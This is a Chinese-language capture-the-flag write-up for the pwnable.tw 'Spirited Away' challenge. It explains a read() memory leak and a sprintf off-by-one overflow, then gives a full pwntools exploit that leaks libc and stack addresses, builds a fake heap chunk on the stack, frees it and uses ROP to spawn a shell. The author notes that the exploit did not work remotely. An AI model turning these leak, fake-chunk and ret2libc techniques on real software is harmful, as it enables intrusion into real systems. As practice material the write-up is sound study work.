## 检查

```
$ file spirited_away 
spirited_away: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=9e6cd4dbfea6557127f3e9a8d90e2fe46b21f842, not stripped
$ checksec spirited_away 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32位程序，没去符号表，只开了NX

## 分析

程序的功能是写评论，输入姓名、年龄等信息，代码很简单，没什么好说的

## 漏洞点

第一个漏洞点是read函数，没有NULL截断，可以泄漏stack和libc信息

第二个漏洞点是栈溢出，来自一个不太常见的函数 sprintf

```c
sprintf(&v1, "%d comment so far. We will review them as soon as we can", cnt);// 溢出
```

这行中，当cnt大于等于100时，该字符串的最后一个字母n会覆盖掉控制字符数量的nbytes变量，n的ascii码值是0x6e，从而造成comment参数的栈溢出，和name的堆溢出，我们可以通过栈溢出修改name参数内的地址从而形成任意地址free

## sprintf函数

### 函数声明

int sprintf(char *string, char *format [,argument,...]);

### 参数列表

- **string**-- 这是指向一个字符数组的指针，该数组存储了 C 字符串。
- **format**-- 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags][width][.precision][length]specifier**
- **[argument]...**：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。

### 功能

将format字符串写入到string所在位置

### 返回值

如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。

## 利用

我们首先泄漏出libc和stack信息（调试查看偏移

然后在栈中构造fake_chunk并利用任意地址free，获取到栈上堆块

最后利用name的溢出进行ROP，可以简单的get shell

## exp

中间出现了一点匪夷所思的问题，我不能直接range(100)，这样会泄漏出错误的东西，即

```python
leave = lambda name,reason,comment : (sa("name: ",name),sa("age: ","1\n"),sa("movie? ",reason),sa("comment: ",comment))
addone = lambda : sa("<y/n>: ","y")

#overflow
for i in range(10):
	leave("aaa","bbb","ccc")
	addone()
```

参考了别的师傅的wp后，改成range(10)和range(90)，可以leak成功

```python
leave = lambda name,reason,comment : (sa("name: ",name),sa("age: ","1\n"),sa("movie? ",reason),sa("comment: ",comment))
addone = lambda : sa("<y/n>: ","y")

#overflow
for i in range(10):
	leave("aaa","bbb","ccc")
	addone()

for i in range(90):
    sa('Please enter your age: ', '1\n')
    sa('Why did you came to see this movie? ', 'c\x00')
    sa('Would you like to leave another comment? <y/n>: ', 'y')
```

经过调试发现，我range(10)次后，已经不需要，准确的说已经无法输入部分信息了，暂时还没想清楚为啥，如果有师傅知道。还请告知：wu.guang.zheng@qq.com

但是又出现了一个令人沮丧的东西：远程打不通

经过尝试，我自己和部分wp会出现timeout，而直接抄的别的师傅的wp，查看交互会经常出现它获取到的信息和我输入的信息不匹配的情况，故我猜测是题目的问题，就先放弃远程打通了

最终exp：

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 0
if debug:
	elf = ELF("./spirited_away")
	libc = ELF("./my_ubuntu32_libc.so")
	io = process(elf.path)
else:
	elf = ELF("./spirited_away")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10204)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

leave = lambda name,reason,comment : (sa("name: ",name),sa("age: ","1\n"),sa("movie? ",reason),sa("comment: ",comment))
addone = lambda : sa("<y/n>: ","y")

#overflow
for i in range(10):
	leave("aaa","bbb","ccc")
	addone()

for i in range(90):
    sa('Please enter your age: ', '1\n')
    sa('Why did you came to see this movie? ', 'c\x00')
    sa('Would you like to leave another comment? <y/n>: ', 'y')

#leak libc
payload1 = 'a'*0x14 + "bbbb"
leave("aaa",payload1,"aaa")
ru("bbbb")
libc_addr = u32(r(4)) -7 -libc.sym["_IO_file_sync"]
addone()


system_addr = libc_addr + libc.sym['system']
binsh_addr = libc_addr + libc.search("/bin/sh").next()

#leak stack
payload2 = 'a'*0x34 + "bbbb"
leave("aaa",payload2,"aaa")
ru("bbbb")
stack_addr = u32(r(4)) - 0x70
log.warn("leak:0x%x"%stack_addr)
addone()
#fake chunk

reason = p32(0) + p32(0x41) + 'a'*0x38 + p32(0) + p32(0x11)
comment = 'a'*0x54 + p32(stack_addr+8)
leave('aaa',reason,comment)
addone()


#heap overflow
name = 'a'*0x4c + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
leave(name,'aaa','aaa')
sa('Would you like to leave another comment? <y/n>: ', 'n')

io.interactive()

```

ps：原来题目名是千与千寻，老二次元了

参考：

- [pwnable.tw 11~18题 writeup](https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/)
- [pwnable.tw Spirited Away writeup](http://blog.eonew.cn/archives/1133)
- [pwnable.tw Spirited Away](https://j-kangel.github.io/2020/06/23/pwnable-tw-Spirited-Away/#%E5%89%8D%E8%A8%80)

